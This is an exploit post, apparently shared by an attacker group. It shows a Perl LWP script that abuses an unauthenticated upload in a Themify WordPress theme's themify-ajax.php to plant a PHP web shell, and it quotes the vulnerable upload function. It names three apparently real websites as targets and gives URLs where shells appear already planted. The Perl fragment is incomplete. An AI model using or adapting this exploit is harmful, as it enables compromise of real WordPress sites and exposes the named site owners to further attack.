 

use LWP::Simple;
use LWP 5.64;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Request::Common qw(POST);

#my shell thumb_editor.php



  my $url = "http://".$site."wp-content/themes/".$theme."/themify/themify-ajax.php?upload=1"
    my $ua  = LWP::UserAgent->new;
    $ua->timeout(20);
    my $req = POST($url, Content_Type => &#039;form-data&#039;,
                         Content => \@parameters );
        my $res = $ua->request($req);


shell http://".$site."wp-content/themes/".$theme."/uploads/thumb_editor.php




prof of concept:


code not properly sanitized at get function:

	function themify_upload(){
		if(!empty($_FILES)) {
			if(!isset($_POST[&#039;target&#039;]) || $_POST[&#039;target&#039;] == &#039;&#039;){
				$target = TEMPLATEPATH.&#039;/uploads/&#039;;
			} else {
				$target = TEMPLATEPATH.&#039;/&#039;.$_POST[&#039;target&#039;];
			}	
			$target = rtrim($target, "/");
			$check = false;
			if(!is_dir($target)){		
				if(!mkdir($target, 0777, true)){
					echo "false";	
				} else {
					$check = true; 	
				}
			} else {
				$check = true;	
			}
			if($check){
				if(move_uploaded_file($_FILES[&#039;Filedata&#039;][&#039;tmp_name&#039;], $target."/".str_replace(" ", "-", basename($_FILES[&#039;Filedata&#039;][&#039;name&#039;])))){
					echo str_replace(" ", "-", basename($_FILES[&#039;Filedata&#039;][&#039;name&#039;]));
				} else {
					echo "false";
				}
			}
		}
	}
	if($_GET[&#039;upload&#039;]){
		themify_upload();
	}


example
http://www.platformart.org/wp-content/themes/pinboard/themify/themify-ajax.php
http://itokenv.com/wp-content/themes/elemin/themify//themify-ajax.php
http://ericweiss.me/wp-content/themes/folo/themify/themify-ajax.php


shell
http://www.platformart.org/wp-content/themes/pinboard/uploads/thumb_editor.php
http://itokenv.com/wp-content/themes/elemin/uploads/thumb_editor.php
http://ericweiss.me/wp-content/themes/folo/uploads/thumb_editor.php


dark crew friends    italians discovers

